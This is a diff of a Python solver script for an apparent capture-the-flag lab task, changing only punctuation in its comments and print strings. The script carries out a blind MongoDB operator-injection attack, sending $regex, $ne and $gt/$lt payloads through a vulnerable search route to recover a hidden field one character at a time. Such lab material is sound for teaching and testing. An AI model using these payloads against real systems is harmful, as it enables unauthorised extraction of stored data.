@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""solvers/p4_1.py — Task 4.1 "Basic Records Room" canonical exploit.
+"""solvers/p4_1.py, Task 4.1 "Basic Records Room" canonical exploit.
 
 The archive search route builds a MongoDB query directly out of raw
 request input:
@@ -9,37 +9,37 @@ request input:
 and never checks that `value` is actually a string before it reaches
 that query. An ordinary caller sends a flat string (`value=archivist`)
 and gets an ordinary equality match. But if `value` arrives as a *dict*
-instead — either a raw JSON body (`{"value": {"$regex": "^adm"}}`), or a
+instead, either a raw JSON body (`{"value": {"$regex": "^adm"}}`), or a
 bracket-notation query string (`value[$regex]=^adm`, which this route
-reconstructs into the same nested dict) — MongoDB doesn't compare the
+reconstructs into the same nested dict), MongoDB doesn't compare the
 dict as a literal. It honors it as real query operators: `$regex`,
 `$gt`, `$lt`, `$ne`, `$eq`, ... against the field.
 
 The route's own response is deliberately minimal (blind): it never
 returns document content, only whether *anything* matched. This solver
 walks a hidden document field (`archive_key`, seeded by
-seed/mongo/init_p4_flag.js on exactly one `records` document — see that
+seed/mongo/init_p4_flag.js on exactly one `records` document, see that
 file) one character at a time, using that match/no-match bit as the
 oracle, exactly like a real blind-extraction engagement:
 
-  Step 0 — prove the type-confusion actually happens (a dict really
+  Step 0, prove the type-confusion actually happens (a dict really
            reaches MongoDB as operators, not as a literal being
            stringified) using both `$ne` and `$regex` against a public
            field (`subject`) whose real value we already know from the
            seed.
-  Step 1 — confirm `archive_key` exists and starts with "SEIYAKU" via
+  Step 1, confirm `archive_key` exists and starts with "SEIYAKU" via
            `$regex`.
-  Step 2 — binary-search the field's total length via `$regex`
+  Step 2, binary-search the field's total length via `$regex`
            (`^.{1,mid}$`).
-  Step 3 — recover the value character-by-character via `$regex`
+  Step 3, recover the value character-by-character via `$regex`
            character-class bisection (same shape as p1_5's ASCII/
            SUBSTRING binary search, but the "substring" primitive here
            is a regex anchored on the already-known prefix).
-  Step 4 — cross-validate the fully recovered value using a completely
+  Step 4, cross-validate the fully recovered value using a completely
            different operator family (`$gt`/`$lt`/`$eq` bracketing),
            independent of the regex walk that found it.
 
-This is a real, live extraction against the running stack — every
+This is a real, live extraction against the running stack, every
 character below is recovered by actually querying the real seeded
 MongoDB through the real vulnerable route, not hardcoded or simulated.
 The expected flag is only used for the final assertion.
@@ -113,7 +113,7 @@ def oracle(field: str, value) -> bool:
 
 
 def step0_confirm_type_confusion() -> None:
-    print("[p4_1] step 0 — confirm the search oracle + real type confusion")
+    print("[p4_1] step 0, confirm the search oracle + real type confusion")
 
     ok = oracle(PUBLIC_FIELD, PUBLIC_VALUE)
     print(f"  {PUBLIC_FIELD}={PUBLIC_VALUE!r} (plain string) -> matched={ok}")
@@ -128,7 +128,7 @@ def step0_confirm_type_confusion() -> None:
     # If the app were safely stringifying non-string input (or rejecting
     # it), a dict would never behave like an operator here. $ne against an
     # impossible value should match every document that HAS the field and
-    # isn't equal to that impossible value — i.e. it should match, proving
+    # isn't equal to that impossible value, i.e. it should match, proving
     # MongoDB is evaluating {"$ne": ...} as a real operator, not comparing
     # the dict itself as a literal.
     ne_ok = oracle(PUBLIC_FIELD, {"$ne": "definitely-not-a-real-subject-xyz"})
@@ -148,7 +148,7 @@ def step0_confirm_type_confusion() -> None:
 
 
 def step1_confirm_hidden_field() -> None:
-    print(f"[p4_1] step 1 — confirm hidden field {FLAG_FIELD!r} exists and starts with SEIYAKU")
+    print(f"[p4_1] step 1, confirm hidden field {FLAG_FIELD!r} exists and starts with SEIYAKU")
     ok = oracle(FLAG_FIELD, {"$regex": "^SEIYAKU"})
     print(f"  {FLAG_FIELD}[$regex]='^SEIYAKU' -> matched={ok}")
     if not ok:
@@ -157,7 +157,7 @@ def step1_confirm_hidden_field() -> None:
 
 
 def step2_discover_length() -> int:
-    print(f"[p4_1] step 2 — binary-search LENGTH({FLAG_FIELD}) via $regex")
+    print(f"[p4_1] step 2, binary-search LENGTH({FLAG_FIELD}) via $regex")
     lo, hi = 0, MAX_LEN
     while lo < hi:
         mid = (lo + hi) // 2
@@ -173,7 +173,7 @@ def step2_discover_length() -> int:
 
 
 def step3_discover_value(length: int) -> str:
-    print(f"[p4_1] step 3 — walk {FLAG_FIELD} char-by-char via $regex character-class bisection")
+    print(f"[p4_1] step 3, walk {FLAG_FIELD} char-by-char via $regex character-class bisection")
     prefix = ""
     for position in range(1, length + 1):
         lo, hi = ASCII_LOW, ASCII_HIGH
@@ -192,7 +192,7 @@ def step3_discover_value(length: int) -> str:
 
 
 def step4_cross_validate(value: str) -> None:
-    print(f"[p4_1] step 4 — cross-validate recovered value via $gt/$lt/$eq bracketing")
+    print(f"[p4_1] step 4, cross-validate recovered value via $gt/$lt/$eq bracketing")
 
     eq_ok = oracle(FLAG_FIELD, {"$eq": value})
     print(f"  {FLAG_FIELD}[$eq]={value!r} -> matched={eq_ok}")
